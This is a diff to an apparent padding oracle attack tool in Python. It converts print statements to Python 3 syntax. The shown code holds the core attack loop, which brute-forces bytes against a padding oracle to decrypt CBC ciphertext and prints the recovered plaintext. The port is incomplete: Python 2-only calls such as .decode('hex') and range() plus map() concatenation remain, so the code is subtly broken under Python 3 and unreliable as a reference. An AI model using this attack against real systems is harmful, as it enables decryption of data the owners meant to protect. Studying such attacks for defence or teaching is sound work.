@@ -63,16 +63,16 @@ def oracle_padding_recovery(ciphertext, oracle_fun, size_block=16, search_charse
         recovered_block = recover_block(block, cipher_block, found, oracle_fun, size_block, search_charset)
         result.insert(0, recovered_block)
         print("[+] Decrypted current value (ASCII):", "".join(result).decode("hex"))
-    print ''
+    print()
     hex_result = ''.join(result).upper()
-    print "[+] Decrypted value (HEX):", hex_result
+    print("[+] Decrypted value (HEX):", hex_result)
     padding_length = int(hex_result[len(hex_result) - 2:len(hex_result)], 16)
-    print "[+] Decrypted value (ASCII):", hex_result[0:-(padding_length * 2)].decode("hex")
+    print("[+] Decrypted value (ASCII):", hex_result[0:-(padding_length * 2)].decode("hex"))
 
 
 def recover_block(block, cipher_block, found, oracle_fun, size_block, search_charset):
     valid_value = []
-    print"[+] Search value of block:", block, "\n"
+    print("[+] Search value of block:", block, "\n")
     for i in range(0, size_block):
         for index, ct_pos in enumerate(range(size_block)+(map(ord, search_charset))):
             if ct_pos != i + 1 or (
@@ -96,25 +96,24 @@ def recover_block(block, cipher_block, found, oracle_fun, size_block, search_cha
                     found = True
                     value = re.findall('..', bk)
                     valid_value.insert(0, value[size_block - (i + 1)])
-                    print ''
-                    print "[+] Block M_Byte : %s" % bk
-                    print "[+] Block C_{i-1}: %s" % bp
-                    print "[+] Block Padding: %s" % bc
-                    print ''
+                    print()
+                    print("[+] Block M_Byte : %s" % bk)
+                    print("[+] Block C_{i-1}: %s" % bp)
+                    print("[+] Block Padding: %s" % bc)
+                    print()
                     bytes_found = ''.join(valid_value)
-                    print '\033[36m' + '\033[1m' + "[+]" + '\033[0m' + " Found", i + 1, "bytes :", bytes_found
-                    print '\033[36m' + '\033[1m' + "[+]" + '\033[0m' + " Found", i + 1, "bytes (ascii) :", bytes_found.decode(
-                        "hex")
-                    print ''
+                    print('\033[36m' + '\033[1m' + "[+]" + '\033[0m' + " Found", i + 1, "bytes :", bytes_found)
+                    print('\033[36m' + '\033[1m' + "[+]" + '\033[0m' + " Found", i + 1, "bytes (ascii) :", bytes_found.decode("hex"))
+                    print()
                     break
         if not found:
-            print "\n[-] Error, decryption failed for byte %d" % i
+            print("\n[-] Error, decryption failed for byte %d" % i)
             valid_value.insert(0, '3f')
-            print ''
+            print() 
             bytes_found = ''.join(valid_value)
-            print '\033[36m' + '\033[1m' + "[+]" + '\033[0m' + " Found", i + 1, "bytes :", bytes_found
-            print '\033[36m' + '\033[1m' + "[+]" + '\033[0m' + " Found", i + 1, "bytes :", bytes_found.decode("hex")
-            print ''
+            print('\033[36m' + '\033[1m' + "[+]" + '\033[0m' + " Found", i + 1, "bytes :", bytes_found)
+            print('\033[36m' + '\033[1m' + "[+]" + '\033[0m' + " Found", i + 1, "bytes :", bytes_found.decode("hex"))
+            print()
         found = False
     return ''.join(valid_value)
 
